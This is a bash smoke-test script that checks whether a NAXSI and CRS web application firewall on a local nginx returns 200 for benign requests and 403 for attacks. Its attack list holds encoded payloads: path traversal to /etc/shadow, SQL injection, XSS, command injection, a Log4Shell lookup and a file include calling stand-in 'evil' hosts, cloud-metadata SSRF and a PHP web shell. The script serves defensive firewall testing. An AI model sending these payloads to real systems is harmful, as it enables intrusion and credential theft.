#!/usr/bin/env bash
# Benign / attack smoke matrix for a live NAXSI+CRS location.
# Adjust BASE URL to match your test nginx. Expect 200 for BENIGN, 403 for ATTACKS.
# nginx -t alone is NOT sufficient validation (see AUDIT_FIXES.md).
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:18081}"
UA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
BR=(-H 'Host: example.com'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8'
    -H 'Accept-Encoding: gzip, deflate, br'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Connection: keep-alive'
    -A "$UA")
req(){ curl -s "${BR[@]}" "$@" -o /dev/null -w '%{http_code}'; }
echo "=== BENIGN (expect 200) BASE=$BASE ==="
for p in "/" "/index.html" "/products?id=42&sort=price" "/search?q=caf%C3%A9+na%C3%AFve" \
         "/blog/2026/07/my-post-title" "/api/v1/users?page=2&per_page=50"; do
  printf "%s  GET %s\n" "$(req "$BASE$p")" "$p"
done
printf "%s  POST urlencoded form\n" "$(req -d 'name=anton&comment=hello+world+this+is+fine' "$BASE/submit")"
printf "%s  POST json\n" "$(req -H 'Content-Type: application/json' -d '{"a":1,"b":"some text"}' "$BASE/api")"
printf "%s  GET with cookie\n" "$(req -H 'Cookie: sid=abc123; theme=dark' "$BASE/dash")"
printf "%s  POST multipart upload\n" "$(req -F 'title=my notes' -F 'file=@/etc/hostname' "$BASE/upload")"
printf "%s  GET long article path\n" "$(req "$BASE/2026/07/28/how-we-cut-p99-latency-by-40-percent?utm_source=news&utm_campaign=q3")"
echo "=== ATTACKS (expect 403) ==="
for u in "/?f=/etc/passwd" "/?f=..%2F..%2F..%2Fetc%2Fshadow" "/?q=1+UNION+SELECT+password+FROM+users" \
         "/?q=1%27+OR+%271%27%3D%271" "/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
         "/?x=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E" "/?c=%3Bcat+%2Fetc%2Fpasswd" \
         "/?j=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fx%7D" "/?p=php%3A%2F%2Ffilter%2Fconvert.base64-encode" \
         "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F" "/?r=http%3A%2F%2Fevil.com%2Fshell.txt%3F" \
         "/?s=%2Fbin%2Fbash+-c+id" "/?e=%3C%3Fphp+system(%24_GET%5B0%5D)%3B+%3F%3E"; do
  printf "%s  %s\n" "$(req "$BASE$u")" "$u"
done
